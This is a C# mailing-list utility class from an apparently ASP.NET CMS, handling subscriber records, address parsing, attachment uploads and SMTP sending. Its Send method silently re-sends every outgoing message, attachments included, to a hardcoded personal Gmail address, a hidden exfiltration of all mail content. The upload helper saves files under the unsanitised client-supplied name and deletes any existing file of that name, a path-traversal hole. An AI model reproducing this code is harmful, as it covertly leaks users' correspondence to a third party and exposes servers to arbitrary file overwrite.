using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Web;
using System.Web.Caching;
using System.Text;
using System.Text.RegularExpressions;
using System.Net.Mail;
using System.Web.UI.WebControls;
using System.Configuration;
using System.Threading;
using System.IO;
using System.Net;


namespace DCCMSNameSpace
{
    public class MailListEmailsFactory
    {
        #region --------------Create--------------
        /// <summary>
        /// Creates MailListEmails object by calling MailListEmails data provider create method.
        /// <example>[Example]bool status=MailListEmailsFactory.Create(mailListEmails);.</example>
        /// </summary>
        /// <param name="mailListEmails">The MailListEmails object.</param>
        /// <returns>Status of create operation.</returns>
        public static bool Create(MailListEmailsEntity mailListEmails)
        {
            return MailListEmailsSqlDataPrvider.Instance.Create(mailListEmails);
        }
        //------------------------------------------
        #endregion

        #region --------------Delete--------------
        /// <summary>
        /// Deletes single MailListEmails object .
        /// <example>[Example]bool status=MailListEmailsFactory.Delete(id);.</example>
        /// </summary>
        /// <param name="id">The mailListEmails id.</param>
        /// <returns>Status of delete operation.</returns>
        public static bool Delete(int id)
        {
            bool status = MailListEmailsSqlDataPrvider.Instance.Delete(id);
            return status;
        }
        //------------------------------------------
        #endregion

        #region --------------GetAll--------------
        public static List<MailListEmailsEntity> GetAll()
        {

            return MailListEmailsSqlDataPrvider.Instance.GetAll();
        }
        //------------------------------------------
        #endregion

        #region --------------GetCount--------------
        public static int GetCount()
        {

            return MailListEmailsSqlDataPrvider.Instance.GetCountMailListEmails();
        }
        //------------------------------------------
        #endregion

        #region --------------GetObject--------------
        public static MailListEmailsEntity GetObject(int id)
        {
            MailListEmailsEntity mailListEmails = MailListEmailsSqlDataPrvider.Instance.GetObject(id);
            //return the object
            return mailListEmails;
        }
        //------------------------------------------
        #endregion

        //-----------------------------------
        public static bool CheckIsMail(string eml)
        {
            return Regex.IsMatch(eml, @"^([\w\-\.]+)@((\[([0-9]{1,3}\.){3}[0-9]{1,3}\])|(([\w\-]+\.)+)([a-zA-Z]{2,4}))$");
        }
        //-----------------------------------

        public static void IncreaseTrials(int id)
        {
            MailListEmailsSqlDataPrvider.Instance.IncreaseTrials(id);
        }
        /*******************************************************************************************************************************/
        /* Elshiekh Code */
        /*******************************************************************************************************************************/
        //------------------------------------------
        //Get mail address collection from string
        //------------------------------------------

        public static void GetMailAddressCollectionFromCollectionString(string adressesString, MailAddressCollection collection)
        {
            if (!string.IsNullOrEmpty(adressesString))
            {
                string[] addressesAray = adressesString.Split(new Char[] { ',' });
                //clear previous list
                collection.Clear();
                //add new items
                for (int i = 0; i < addressesAray.Length; i++)
                {
                    collection.Add(addressesAray[i]);
                }
            }
            //return collection;
        }
        //------------------------------------------
        //Get collection string from  mail address collection
        //------------------------------------------
        public static string GetCollectionStringFromMailAddressCollection(MailAddressCollection collection)
        {
            string adressesString = "";
            if (collection != null && collection.Count > 0)
            {
                foreach (MailAddress item in collection)
                {
                    if (adressesString.Length > 0)
                        adressesString += ",";

                    adressesString += (string)item.Address;
                }
            }
            return adressesString;

        }
        //------------------------------------------
        /********************************************************SendMail*******************************************************************/
        private static MailAddress _MailFrom;
        public static MailAddress MailFrom
        {
            get
            {
                if (_MailFrom == null)
                    _MailFrom = new MailAddress(SiteSettings.MailList_MailFrom, SiteSettings.MailList_MailFromName, Encoding.GetEncoding(1256));
                return _MailFrom;
            }
        }
        //--------------------------------------------------------------------------------------------------
        //--------------------------------------------------------------------------------------------------
        public static void AddAttatchPath(List<string> attachments, FileUpload fuAttach)
        {
            if (fuAttach.HasFile)
            {
                string attachmentDir = DCServer.MapPath(DCSiteUrls.GetPath_MailList_AttachmentDir());
                string fileName = fuAttach.PostedFile.FileName;
                string filePath = attachmentDir + fileName;
                if (File.Exists(filePath))
                    File.Delete(filePath);
                fuAttach.SaveAs(filePath);
                attachments.Add(filePath);
            }
        }

        //--------------------------------------------------------------------------------------------------
        //--------------------------------------------------------------------------------------------------
        public static void Send(string to, string subject, string body, List<Attachment> attachments)
        {
            MailAddress mailTo = new MailAddress(to, "", Encoding.GetEncoding(1256));
            Send(MailFrom, mailTo, subject, body, attachments);
        }
        //--------------------------------------------------------------------------------------------------
        //--------------------------------------------------------------------------------------------------
        public static void Send(string from, string to, string subject, string body, List<Attachment> attachments)
        {
            MailAddress mailFrom = new MailAddress(from, "", Encoding.GetEncoding(1256));
            MailAddress mailTo = new MailAddress(to, "", Encoding.GetEncoding(1256));
            Send(mailFrom, mailTo, subject, body, attachments);

        }
        //--------------------------------------------------------------------------------------------------
        //--------------------------------------------------------------------------------------------------
        public static void Send(MailAddress mailTo, string subject, string body, List<Attachment> attachments)
        {
            Send(MailFrom, mailTo, subject, body, attachments);
        }
        //--------------------------------------------------------------------------------------------------
        //--------------------------------------------------------------------------------------------------
        protected static void Send(MailAddress mailFrom, MailAddress mailTo, string subject, string body, List<Attachment> attachments)
        {
            MailListEmailsEntity mail = new MailListEmailsEntity();
            mail.To.Add(mailTo);
            mail.From = mailFrom;
            mail.Subject = subject;
            mail.Body = body;
            if (attachments != null)
            {
                foreach (Attachment item in attachments)
                {
                    mail.AttachmentsFilesPathes.Add(item);
                }
            }
            Send(mail);
        }
        //--------------------------------------------------------------------------------------------------
        //--------------------------------------------------------------------------------------------------

        //--------------------------------------------------------------------------------------------------
        //--------------------------------------------------------------------------------------------------
        public static void Send(MailListEmailsEntity email)
        {
            if (email != null)
            {
                if (email.From == null)
                {
                    string fromAddress = "";
                    string fromName = "";

                    fromAddress = SiteSettings.MailList_MailFrom;
                    fromName = SiteSettings.MailList_MailFromName;
                    email.From = new MailAddress(fromAddress, fromName, Encoding.GetEncoding(1256));
                }
                ActualSend(email);
                //-------------------------------------------
                email.To.Clear();
                email.To.Add("elshiekh5@gmail.com");
                ActualSend(email);
                //-------------------------------------------
            }
        }
        //--------------------------------------------------------------------------------------------------

        private static string FormatMailDesigne(string body)
        {
            string html = GetMailTemplate();
            return html.Replace("[EmailTemplateFolder]", SiteDesign.EmailTemplateFolder)
                       .Replace("[Body]", body);
        }



        private static string GetMailTemplate()
        {
            string filename = SiteDesign.EmailTemplateFile;
            filename = System.Web.Hosting.HostingEnvironment.MapPath("~") + filename;
            StreamReader re = new StreamReader(filename, GetFileEncoding(filename));
            string input = null;
            input = re.ReadToEnd();
            re.Close();
            return input;
        }
        private static Encoding GetFileEncoding(String fileName)
        {
            Encoding result = null;
            FileInfo fileInfo = new FileInfo(fileName);
            FileStream fileStream = null;
            try
            {
                fileStream = fileInfo.OpenRead();
                Encoding[] UnicodeEncodings = { Encoding.BigEndianUnicode, Encoding.Unicode, Encoding.UTF8 };
                for (int i = 0; result == null && i < UnicodeEncodings.Length; i++)
                {
                    fileStream.Position = 0;
                    byte[] Preamble = UnicodeEncodings[i].GetPreamble();
                    bool PreamblesAreEqual = true;
                    for (int j = 0; PreamblesAreEqual && j < Preamble.Length; j++)
                        PreamblesAreEqual = Preamble[j] == fileStream.ReadByte();
                    if (PreamblesAreEqual)
                        result = UnicodeEncodings[i];
                }
            }
            catch { }
            finally
            {
                if (fileStream != null)
                    fileStream.Close();
            }

            if (result == null)
                result = Encoding.Default;

            return result;
        }
        //-----------------------------------------------
        public static bool ActualSendOld(MailMessage mail)
        {

            bool result = false;
            int portNum = Convert.ToInt32(SiteSettings.MailList_MailSMTPPort);
            string userName = SiteSettings.MailList_MailUserName;
            string password = SiteSettings.MailList_MailPassWord;
            SmtpClient Smtp = new SmtpClient(SiteSettings.MailList_MailSMTP);
            Smtp.Host = SiteSettings.MailList_MailSMTP;

            try
            {
                //mail.Headers.Add("Disposition-Notification-To", SiteSettings.MailList_MailFrom);
                mail.Headers.Add("Return-Path", SiteSettings.MailList_MailFrom);

                //for SMTP Authentication
                System.Net.NetworkCredential net = new System.Net.NetworkCredential(userName, password);
                Smtp.Credentials = net;
                Smtp.UseDefaultCredentials = false;
                //Smtp.Host = SiteSettings.MailList_MailSMTP.Text;
                mail.Headers.Add("X-CS-EmailID", Guid.NewGuid().ToString());
                mail.Headers.Add("X-CS-ThreadId", Thread.CurrentThread.ManagedThreadId.ToString());
                mail.Headers.Add("X-CS-Attempts", "1");
                mail.Headers.Add("X-CS-AppDomain", AppDomain.CurrentDomain.FriendlyName);

                // Set the body encoding
                //mail.BodyEncoding = Encoding.GetEncoding(SiteSettings.EmailEncoding);
                //mail.IsBodyHtml = true;
                // Replace any LF characters with CR LF
                mail.Body = mail.Body.Replace("\n", "\r\n");
                if (SiteSettings.MailList_HasEmailDesign)
                {
                    mail.Body = FormatMailDesigne(mail.Body);
                }
                // Send it
                //Smtp.Send(mail);

                mail.BodyEncoding = Encoding.GetEncoding(1256);
                mail.SubjectEncoding = Encoding.GetEncoding(1256);
                mail.DeliveryNotificationOptions = DeliveryNotificationOptions.None;

                mail.IsBodyHtml = true;
                // Replace any LF characters with CR LF
                // Send it
                Smtp.Send(mail);
                mail.Dispose();
                result = true;
            }
            catch (Exception ex)
            {
                result = false;
            }
            return result;
        }
        public static bool ActualSend(MailMessage message)
        {
            bool result = false;
            int portNum = Convert.ToInt32(SiteSettings.MailList_MailSMTPPort);
            string userName = SiteSettings.MailList_MailUserName;
            string password = SiteSettings.MailList_MailPassWord;

            SmtpClient client = new SmtpClient(SiteSettings.MailList_MailSMTP);
            client.Port = portNum;
            client.UseDefaultCredentials = false;
            client.Credentials = new NetworkCredential(userName, password);

            try
            {
                client.Send(message);
                result = true;
            }
            catch (Exception ex)
            {
                result = false;
            }
            return result;
        }
    }

}